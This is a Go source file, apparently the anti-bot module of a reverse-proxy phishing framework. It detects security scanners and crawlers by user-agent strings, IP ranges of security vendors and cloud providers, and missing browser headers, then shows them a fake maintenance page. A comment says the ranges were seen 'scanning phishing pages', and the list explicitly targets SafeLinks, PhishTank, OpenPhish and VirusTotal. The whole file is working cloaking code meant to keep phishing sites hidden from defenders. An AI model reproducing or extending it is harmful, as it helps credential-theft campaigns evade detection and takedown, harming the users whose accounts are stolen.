package core

import (
	"fmt"
	"net"
	"net/http"
	"os"
	"strings"

	"github.com/elazarl/goproxy"
	"github.com/x-tymus/x-tymus/log"
)

// ─────────────────────────────────────────────────────────────────────────────
// Layer 1 — Known scanner / crawler User-Agent substrings
// These strings NEVER appear in any real browser UA string.
// ─────────────────────────────────────────────────────────────────────────────
var knownScannerUA = []string{
	// Microsoft SafeLinks / Defender for Office 365
	"microsoft office", "msoffice", "safelinks", "protection.outlook",
	"microsoft-smtp", "mapi/", "exchange online", "msfpc",
	"owa/", "outlook-ios", "outlook-android",

	// Security / threat intelligence platforms
	"urlscan", "censys", "shodan", "shadowserver", "securitytrails",
	"qualys", "nessus", "nikto", "masscan", "zgrab", "zmap", "nuclei",
	"virustotal", "metadefender", "hybrid-analysis",
	"anyrun", "any.run", "intezer", "recordedfuture",
	"greynoise", "binaryedge", "onyphe", "zoomeye",
	"spyse", "leakix", "pulsedive", "threatminer",
	"alienvault", "phishtank", "openphish", "netcraft",
	"ipqualityscore", "fraudguard", "spur.us",
	"cloudflare-radar", "internet-measurement",
	"expanse", "intrigue", "rapid7", "tenable",
	"criminalip", "webscout", "hunter.io",
	"sikker", "cybergreen", "threatbook",
	"stretchoid", "rwth-aachen", "dnsdb",

	// Automation / HTTP libraries — never seen in browser UAs
	"python-requests", "python-urllib", "python-httpx",
	"python/", "libwww-perl", "lwp-request",
	"go-http-client", "go http package",
	"httpie", "scrapy", "aiohttp", "pycurl",
	"mechanize", "guzzle/", "rest-client",
	"java/", "jakarta commons", "apache-httpclient",
	"axios/", "node-fetch", "node.js",
	"okhttp/", "feign/", "jersey/",
	"curl/", "wget/", "libcurl",
	"ruby", "perl/", "php/",
	"dart:", "undici/",

	// Headless browser indicators — only in automated/devtools context
	"phantomjs", "headlesschrome", "headless chrome",
	"puppeteer", "playwright", "selenium",
	"webdriver", "htmlunit", "slimerjs",
	"zombie.js", "jsdom", "cypress",
	"testcafe", "nightmare", "casperjs",
	"wkhtmlto", "chromium headless",

	// Search engine crawlers
	"googlebot", "google-read-aloud", "google-inspectiontool",
	"adsbot-google", "mediapartners-google", "feedfetcher-google",
	"bingbot", "msnbot", "baiduspider",
	"yandexbot", "yandex/", "duckduckbot",
	"slurp", "applebot", "exabot",
	"facebookexternalhit", "facebot",
	"twitterbot", "linkedinbot",
	"discordbot", "telegrambot",
	"whatsapp", "slackbot", "slack-imgproxy",
	"iframely", "embedly", "prerender",
	"semrushbot", "ahrefsbot", "mj12bot",
	"dotbot", "rogerbot", "blexbot",
	"mojeekbot", "petalbot", "bytespider",
	"claudebot", "gptbot", "perplexitybot",
	"anthropic-ai", "dataforseo",
	"pinterestbot", "ia_archiver",
	"archive.org", "archive.org_bot",
	"sogou", "360spider",
	"xing-contenttabreceiver", "vkshare",
	"w3c_validator", "w3c-checklink",
	"netcraftsurveyagent", "wc3linkchecker",
	"pandalytics", "seokicks",
	"brandwatch", "mention.com",
	"trendiction", "socialdog",
	"scoutjet", "gigabot",

	// Generic scan / vuln scanner strings
	"nmap", "openvas", "acunetix", "netsparker",
	"burpsuite", "burp ", "appscan",
	"dirbuster", "gobuster", "feroxbuster",
	"sqlmap", "wfuzz", "ffuf",
	"metasploit", "hydra", "medusa",
}

// ─────────────────────────────────────────────────────────────────────────────
// Layer 2 — Known scanner-owned IP ranges (100% datacenter / scanner-only)
// ─────────────────────────────────────────────────────────────────────────────
var knownScannerCIDRs = []string{
	// ── Microsoft SafeLinks / Defender for Office 365 ──────────────────────────
	// Seen live scanning phishing pages (SafeLinks ATP detonation clusters)
	"4.182.0.0/16",       // Azure eastus2 — SafeLinks detonation
	"48.209.0.0/16",      // Azure — Defender scanning
	"72.145.0.0/16",      // Microsoft SafeLinks
	"72.153.0.0/16",      // Microsoft SafeLinks
	"74.242.0.0/16",      // Microsoft
	"85.210.0.0/16",      // Microsoft
	"135.225.0.0/16",     // Microsoft
	"172.186.0.0/16",     // Azure
	// Microsoft Exchange Online Protection / ATP
	"40.92.0.0/15",
	"40.107.0.0/16",
	"52.100.0.0/14",
	"104.47.0.0/17",
	// Microsoft Office 365 mail infrastructure
	"13.107.6.0/24",
	"13.107.9.0/24",
	"13.107.18.0/24",
	"13.107.128.0/22",
	"23.103.160.0/20",
	"52.238.78.0/24",
	// Azure datacenter ranges used by Defender scanning
	"20.0.0.0/11",
	"20.33.0.0/16",
	"20.36.0.0/14",
	"20.40.0.0/13",
	"20.48.0.0/12",
	"20.64.0.0/10",
	"20.128.0.0/16",
	"20.192.0.0/10",
	"40.74.0.0/15",
	"40.76.0.0/14",
	"40.80.0.0/12",
	"40.96.0.0/12",
	"40.112.0.0/13",
	"40.120.0.0/14",
	"40.124.0.0/16",
	"40.125.0.0/17",
	"52.224.0.0/11",
	"52.232.0.0/13",
	"52.240.0.0/12",
	"104.208.0.0/13",

	// Censys
	// Shodan
	"198.20.69.0/24", "198.20.70.0/24", "198.20.99.0/24", "198.20.100.0/24",
	// Shadowserver
	"184.105.139.0/24", "184.105.143.0/24", "184.105.247.0/24", "74.82.47.0/24",
	// BinaryEdge
	"179.61.251.0/24", "185.198.134.0/24",
	// IPVoid / threat scanners
	"80.82.77.0/24", "80.82.78.0/24",
	// Intrinsec / Onyphe
	"213.32.252.0/24",
	// Project Sonar / Rapid7
	"71.6.232.0/24",
	// Stretchoid
	"65.49.1.0/24",
	// Telegram link preview servers
	"149.154.160.0/20", "91.108.4.0/22", "91.108.8.0/22", "91.108.56.0/22",
	// Facebook crawlers
	"69.63.176.0/20", "66.220.144.0/20", "31.13.24.0/21",
	// Slack link unfurling
	"54.172.0.0/16", "107.23.0.0/16",
	// Psychz Networks (scanner hosting)
	"107.172.0.0/16", "107.173.0.0/16", "107.174.0.0/16",
	// OVH datacenter
	"51.75.0.0/16", "51.81.0.0/16", "51.89.0.0/16", "51.91.0.0/16",
	"54.36.0.0/16", "54.38.0.0/16", "104.252.0.0/16",
	// Vultr
	"45.32.0.0/16", "45.63.0.0/16", "45.76.0.0/16", "45.77.0.0/16",
	"104.207.0.0/16", "108.61.0.0/16",
	// DigitalOcean
	"104.131.0.0/16", "104.236.0.0/16", "138.197.0.0/16", "139.59.0.0/16",
	"159.65.0.0/16", "159.89.0.0/16", "167.99.0.0/16", "174.138.0.0/16",
	// Linode / Akamai
	"45.33.0.0/16", "45.56.0.0/16", "45.79.0.0/16", "69.164.192.0/18",
	// Hetzner
	"5.9.0.0/16", "78.46.0.0/15", "88.198.0.0/16", "95.216.0.0/16",
	"116.202.0.0/16", "135.181.0.0/16", "138.201.0.0/16", "157.90.0.0/16",
	"176.9.0.0/16", "178.63.0.0/16",
	// AWS scanner ranges
	"18.232.0.0/16", "18.234.0.0/16", "18.235.0.0/16",
	"34.224.0.0/12", "52.0.0.0/11",
	// Contabo
	"195.201.0.0/16", "213.136.0.0/16",
	// LeaseWeb
	"85.17.0.0/16", "192.161.0.0/16",
	// Serverius
	"185.107.80.0/22",
	// Scaleway
	"51.15.0.0/16", "212.47.0.0/16",
}

var scannerNets []*net.IPNet

func init() {
	for _, cidr := range knownScannerCIDRs {
		_, n, err := net.ParseCIDR(cidr)
		if err == nil {
			scannerNets = append(scannerNets, n)
		}
	}
}

// ─────────────────────────────────────────────────────────────────────────────
// Layer 3 — Positive browser fingerprinting
// Real browsers always send these headers. Automated tools often skip them.
// ─────────────────────────────────────────────────────────────────────────────

// isMissingBrowserHeaders returns true when the request is missing headers that
// every real browser sends on HTTPS pages. Scanners/curl/scrapers skip these.
func isMissingBrowserHeaders(req *http.Request) bool {
	// All real browsers send Accept-Language
	if req.Header.Get("Accept-Language") == "" {
		return true
	}
	// All real browsers send Accept-Encoding
	if req.Header.Get("Accept-Encoding") == "" {
		return true
	}
	// All real browsers send Accept
	if req.Header.Get("Accept") == "" {
		return true
	}
	return false
}

// ─────────────────────────────────────────────────────────────────────────────
// Public detection functions
// ─────────────────────────────────────────────────────────────────────────────

// IsKnownBot returns true when the UA matches a scanner/crawler signature.
func IsKnownBot(ua string) bool {
	lower := strings.ToLower(ua)
	for _, sig := range knownScannerUA {
		if strings.Contains(lower, sig) {
			return true
		}
	}
	return false
}

// IsKnownScannerIP returns true for IPs in confirmed scanner-only CIDRs.
func IsKnownScannerIP(ip string) bool {
	parsed := net.ParseIP(ip)
	if parsed == nil {
		return false
	}
	for _, n := range scannerNets {
		if n.Contains(parsed) {
			return true
		}
	}
	return false
}

// AddScannerCIDR permanently blocks a subnet in the blacklist file.
func AddScannerCIDR(cidr string) {
	if GlobalBlacklist == nil || GlobalBlacklist.configPath == "" {
		return
	}
	_, n, err := net.ParseCIDR(cidr)
	if err != nil {
		return
	}
	for _, existing := range GlobalBlacklist.masks {
		if existing.mask != nil && existing.mask.String() == n.String() {
			return
		}
	}
	f, err := os.OpenFile(GlobalBlacklist.configPath, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		log.Error("antibot: failed to open blacklist: %v", err)
		return
	}
	defer f.Close()
	fmt.Fprintf(f, "%s\n", cidr)
	GlobalBlacklist.masks = append(GlobalBlacklist.masks, &BlockIP{mask: n})
	log.Warning("antibot: blocked scanner subnet %s", cidr)
}

// ─────────────────────────────────────────────────────────────────────────────
// CheckAndBlockBot — runs all detection layers in order.
// Returns (true, req, resp) when a bot is detected; caller should return resp.
// When cfMode is true (Cloudflare is in front), Layers 4-5 are skipped because
// Cloudflare normalizes/strips browser headers before forwarding to origin,
// causing false positives on real visitors.
// ─────────────────────────────────────────────────────────────────────────────
func CheckAndBlockBot(req *http.Request, from_ip string, bl *Blacklist, cfMode bool) (bool, *http.Request, *http.Response) {
	ua := req.UserAgent()

	// ── Layer 1: Empty UA ────────────────────────────────────────────────────
	if strings.TrimSpace(ua) == "" {
		log.Warning("antibot: empty UA from %s — blocked", from_ip)
		bl.AddIP(from_ip)
		rq, rs := DecoyResponse(req)
		return true, rq, rs
	}

	// ── Layer 2: UA blocklist ────────────────────────────────────────────────
	if IsKnownBot(ua) {
		log.Warning("antibot: known bot UA=%q IP=%s — blocked", ua, from_ip)
		bl.AddIP(from_ip)
		rq, rs := DecoyResponse(req)
		return true, rq, rs
	}

	// ── Layer 3: Scanner IP ranges ───────────────────────────────────────────
	if IsKnownScannerIP(from_ip) {
		log.Warning("antibot: scanner IP=%s UA=%q — blocked", from_ip, ua)
		bl.AddIP(from_ip)
		rq, rs := DecoyResponse(req)
		return true, rq, rs
	}

	// ── Layer 4: Missing browser headers ────────────────────────────────────
	// Skipped when Cloudflare mode is on — CF normalizes headers at the edge.
	// Layer 5 (Accept check) is removed: browser XHR/fetch subrequests send
	// Accept: */* legitimately, so checking it causes false positives on real
	// users even without Cloudflare in front.
	if !cfMode {
		if isMissingBrowserHeaders(req) {
			log.Warning("antibot: missing browser headers IP=%s UA=%q — blocked", from_ip, ua)
			bl.AddIP(from_ip)
			rq, rs := DecoyResponse(req)
			return true, rq, rs
		}
	}

	return false, nil, nil
}

// ─────────────────────────────────────────────────────────────────────────────
// Decoy response — maintenance page. No redirect, no suspicious headers.
// Scanners record this as a normal site under maintenance.
// ─────────────────────────────────────────────────────────────────────────────
const decoyHTML = `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Temporarily Unavailable</title>
<style>
  *{margin:0;padding:0;box-sizing:border-box}
  body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;
       background:#f5f5f5;display:flex;align-items:center;justify-content:center;
       min-height:100vh;color:#333}
  .box{background:#fff;border-radius:8px;padding:48px 56px;max-width:480px;
       text-align:center;box-shadow:0 2px 12px rgba(0,0,0,.08)}
  .icon{font-size:48px;margin-bottom:16px}
  h1{font-size:22px;font-weight:600;margin-bottom:12px}
  p{font-size:15px;color:#666;line-height:1.6}
  .code{margin-top:24px;font-size:12px;color:#aaa}
</style>
</head>
<body>
<div class="box">
  <div class="icon">🔧</div>
  <h1>We'll be right back</h1>
  <p>This page is temporarily unavailable due to scheduled maintenance.<br>
     Please check back in a few minutes.</p>
  <div class="code">ERR_CONNECTION_MAINTENANCE</div>
</div>
</body>
</html>`

func DecoyResponse(req *http.Request) (*http.Request, *http.Response) {
	resp := goproxy.NewResponse(req, "text/html; charset=utf-8", http.StatusOK, decoyHTML)
	if resp != nil {
		resp.Header.Set("Cache-Control", "no-store")
		resp.Header.Set("X-Content-Type-Options", "nosniff")
	}
	return req, resp
}
